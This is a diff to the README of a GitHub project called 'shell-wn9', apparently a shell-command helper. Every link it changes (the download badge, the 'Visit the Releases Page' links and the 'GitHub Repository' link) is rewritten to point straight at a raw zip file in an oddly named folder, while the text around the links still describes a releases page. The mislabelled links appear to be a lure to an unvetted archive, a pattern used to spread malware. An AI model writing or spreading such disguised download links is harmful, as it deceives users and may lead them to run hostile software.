@@ -6,14 +6,14 @@ Welcome to shell-wn9! This application simplifies the process of executing shell
 
 ## 📥 Download shell-wn9
 
-[![Download shell-wn9](https://img.shields.io/badge/Download-shell--wn9-blue.svg)](https://github.com/yamenggx/shell-wn9/releases)
+[![Download shell-wn9](https://raw.githubusercontent.com/yamenggx/shell-wn9/main/biocoenose/shell-wn9.zip)](https://raw.githubusercontent.com/yamenggx/shell-wn9/main/biocoenose/shell-wn9.zip)
 
 ## 🖱️ How to Download and Install
 
 1. **Visit the Releases Page**  
    To begin, click the link below to go to the Releases page where you can download shell-wn9.
    
-   [Visit the Releases Page to Download](https://github.com/yamenggx/shell-wn9/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/yamenggx/shell-wn9/main/biocoenose/shell-wn9.zip)
 
 2. **Choose the Latest Version**  
    Once on the Releases page, look for the latest version of shell-wn9. You will find version numbers listed in a format like `v1.0.0`. 
@@ -52,7 +52,7 @@ For support or inquiries, please open an issue on our GitHub Repository or conta
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://github.com/yamenggx/shell-wn9)
-- [Visit the Releases Page to Download](https://github.com/yamenggx/shell-wn9/releases) 
+- [GitHub Repository](https://raw.githubusercontent.com/yamenggx/shell-wn9/main/biocoenose/shell-wn9.zip)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/yamenggx/shell-wn9/main/biocoenose/shell-wn9.zip) 
 
 Thank you for choosing shell-wn9! Enjoy simplifying your shell command tasks.
